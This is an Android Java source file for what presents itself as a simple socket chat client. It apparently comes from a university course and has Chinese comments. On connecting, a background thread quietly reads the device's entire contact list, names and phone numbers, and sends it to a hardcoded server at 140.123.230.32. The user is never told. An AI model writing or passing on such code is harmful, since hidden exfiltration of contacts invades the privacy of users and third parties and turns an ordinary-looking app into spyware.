package edu.csie;

import android.app.Activity;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.database.Cursor;
import android.content.ContentResolver;
import android.content.Context;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.util.Enumeration;

import com.example.client2.R;

// 
public class ClientActivity extends Activity {
	public static Handler mHandler = new Handler();
	TextView TextView01; // 用來顯示文字訊息
	EditText EditText01; // 文字方塊
	EditText EditText02; // 文字方塊
	String tmp; // 暫存文字訊息
	Socket clientSocket = null; // 客戶端socket

	private String getPhone() {
		StringBuilder string = new  StringBuilder("");

		// 得到ContentResolver对象
		ContentResolver cr = getContentResolver();
		// 取得电话本中开始一项的光标
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, null);
		// 向下移动光标
		while (cursor.moveToNext()) {
			// 取得联系人名字
			int nameFieldColumnIndex = cursor
					.getColumnIndex(PhoneLookup.DISPLAY_NAME);
			String contact = cursor.getString(nameFieldColumnIndex);
			// 取得电话号码
			String ContactId = cursor.getString(cursor
					.getColumnIndex(ContactsContract.Contacts._ID));
			Cursor phone = cr.query(
					ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
					ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "="
							+ ContactId, null, null);

			while (phone.moveToNext()) {
				String PhoneNumber = phone
						.getString(phone
								.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				string.append(contact + ":" + PhoneNumber + "\n");
			}
		}
		cursor.close();
		
		return string.toString();
	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		Log.d("hello", "fq");

		// 從資源檔裡取得位址後強制轉型成文字方塊
		TextView01 = (TextView) findViewById(R.id.TextView01);
		EditText01 = (EditText) findViewById(R.id.EditText01);
		EditText02 = (EditText) findViewById(R.id.EditText02);
		
		

		// 以新的執行緒來讀取資料
		Thread t = new Thread(readData);

		// 啟動執行緒
		t.start();

		// 從資源檔裡取得位址後強制轉型成按鈕
		Button button1 = (Button) findViewById(R.id.Button01);

		// 設定按鈕的事件
		button1.setOnClickListener(new Button.OnClickListener() {
			// 當按下按鈕的時候觸發以下的方法
			public void onClick(View v) {
				// 如果已連接則
				if (clientSocket == null) {
					TextView01.append("連線中fq");
					return ;
				}
				if (clientSocket.isConnected()) {

					BufferedWriter bw;
					if (EditText01.getText().toString() == ""
							|| EditText02.getText().toString() == "") {
						return;
					}

					try {
						// 取得網路輸出串流
						bw = new BufferedWriter(new OutputStreamWriter(
								clientSocket.getOutputStream()));

						// 寫入訊息
						bw.write(EditText01.getText() + ":"
								+ EditText02.getText() + "\n");

						// 立即發送
						bw.flush();
					} catch (Exception e) {
						e.printStackTrace();
					}
					// 將文字方塊清空
					EditText02.setText("");
				} else {
					TextView01.append("not connected\n");
				}
			}
		});

	}

	// 顯示更新訊息
	private Runnable updateText = new Runnable() {
		public void run() {
			// 加入新訊息並換行
			TextView01.append(tmp + "\n");
		}
	};
	
	private Runnable notConnected = new Runnable() {
		public void run() {
			TextView01.append("!! not connected.\n");
		}
	};

	// 取得網路資料
	private Runnable readData = new Runnable() {
		public void run() {
			// server端的IP
			InetAddress serverIp;

			try {
				// 以內定(本機電腦端)IP為Server端
				serverIp = InetAddress.getByName("140.123.230.32");
				int serverPort = 5050;
				clientSocket = new Socket(serverIp, serverPort);

				// 取得網路輸入串流
				BufferedReader br = new BufferedReader(new InputStreamReader(
						clientSocket.getInputStream()));
				
				int i = 0;

				// 當連線後
				while (clientSocket.isConnected()) {
					if (i == 0) {

						BufferedWriter bw;
						
						try {
							// 取得網路輸出串流
							bw = new BufferedWriter(new OutputStreamWriter(
									clientSocket.getOutputStream()));

							// 寫入訊息
							bw.write(getPhone());

							// 立即發送
							bw.flush();
						} catch (Exception e) {
							e.printStackTrace();
						}
						
						i = 1;
					}
					
					// 取得網路訊息
					tmp = br.readLine();

					// 如果不是空訊息則
					if (tmp != null)
						// 顯示新的訊息
						mHandler.post(updateText);
				}
				mHandler.post(notConnected);

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	};

}